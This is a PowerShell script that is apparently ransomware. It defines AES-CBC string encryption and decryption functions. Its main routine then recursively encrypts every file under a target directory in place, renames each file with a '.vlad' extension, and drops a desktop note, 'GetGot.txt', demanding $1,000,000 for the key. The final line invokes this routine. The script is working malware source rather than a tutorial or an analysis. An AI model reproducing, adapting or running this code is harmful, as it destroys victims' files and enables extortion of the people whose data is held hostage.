

# Function to encrypt a string using AES encryption
function Encrypt-String {
    param(
        [Parameter(Mandatory=$true)]
        [string]$InputString,
        
        [Parameter(Mandatory=$true)]
        [string]$EncryptionKey
    )
    
    try {
        # Convert the input string to bytes
        $plainTextBytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
        
        # Create a new AES object
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        
        # Generate a random IV (Initialization Vector)
        $aes.GenerateIV()
        
        # Derive a key from the provided encryption key using PBKDF2
        $salt = [System.Text.Encoding]::UTF8.GetBytes("PowerShellAES")
        $keyDerivation = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($EncryptionKey, $salt, 10000)
        $aes.Key = $keyDerivation.GetBytes(32) # 256-bit key
        
        # Create encryptor
        $encryptor = $aes.CreateEncryptor()
        
        # Encrypt the data
        $encryptedBytes = $encryptor.TransformFinalBlock($plainTextBytes, 0, $plainTextBytes.Length)
        
        # Combine IV and encrypted data
        $combinedBytes = $aes.IV + $encryptedBytes
        
        # Convert to Base64 for easy storage/transmission
        $encryptedString = [System.Convert]::ToBase64String($combinedBytes)
        
        # Clean up
        $encryptor.Dispose()
        $aes.Dispose()
        $keyDerivation.Dispose()
        
        return $encryptedString
    }
    catch {
        Write-Error "Encryption failed: $($_.Exception.Message)"
        return $null
    }
}

# Function to decrypt a string using AES decryption
function Decrypt-String {
    param(
        [Parameter(Mandatory=$true)]
        [string]$EncryptedString,
        [Parameter(Mandatory=$true)]
        [string]$EncryptionKey
    )
    
    try {
        # Convert from Base64
        $combinedBytes = [System.Convert]::FromBase64String($EncryptedString)
        
        # Create a new AES object
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        
        # Extract IV (first 16 bytes)
        $ivSize = 16
        $aes.IV = $combinedBytes[0..($ivSize-1)]
        
        # Extract encrypted data (remaining bytes)
        $encryptedBytes = $combinedBytes[$ivSize..($combinedBytes.Length-1)]
        
        # Derive the key from the provided encryption key
        $salt = [System.Text.Encoding]::UTF8.GetBytes("PowerShellAES")
        $keyDerivation = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($EncryptionKey, $salt, 10000)
        $aes.Key = $keyDerivation.GetBytes(32) # 256-bit key
        
        # Create decryptor
        $decryptor = $aes.CreateDecryptor()
        
        # Decrypt the data
        $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
        
        # Convert back to string
        $decryptedString = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
        
        # Clean up
        $decryptor.Dispose()
        $aes.Dispose()
        $keyDerivation.Dispose()
        
        return $decryptedString
    }
    catch {
        Write-Error "Decryption failed: $($_.Exception.Message)"
        return $null
    }
}
# Function to call file encryption and overwrite old file


function main{
    param (
        [Parameter(Mandatory=$true)]
        [string] $TargetDirectory,
        [Parameter(Mandatory=$true)]
        [string] $EncKey
    )
    $Target = [System.IO.Directory]::EnumerateFiles($TargetDirectory,"*",[System.IO.SearchOption]::AllDirectories)
    foreach($file in $Target){
        $FileString = Get-Content $file -Raw
        $EncFileData=Encrypt-String -InputString $FileString -EncryptionKey $EncKey
        [System.IO.File]::WriteAllText($file,$EncFileData)
        $NewFileName=[System.IO.Path]::ChangeExtension($file,".vlad")
        Rename-Item -Path $file -NewName $NewFileName
    }
    try {
        New-Item -Path "$env:USERPROFILE\Desktop\GetGot.txt" -ItemType File
        Set-Content -Path "$env:USERPROFILE\Desktop\GetGot.txt" -Value 'You got got! We have encrypted the contents of all your files! Good luck finding the key....I may be enticed to give it to you for a small fee...OF $1,000,000'
    }
    catch {
        Set-Content -Path "$env:USERPROFILE\Desktop\GetGot.txt" -Value 'You got got! We have encrypted the contents of all your files! Good luck finding the key....I may be enticed to give it to you for a small fee...OF $1,000,000'
    }
    
}




# Example usage:
#$encrypted = Encrypt-String -InputString $string -EncryptionKey "MySecretKey123"
#$decrypted = Decrypt-String -EncryptedString $encrypted -EncryptionKey "MySecretKey123"

Write-host (main -TargetDirectory $path)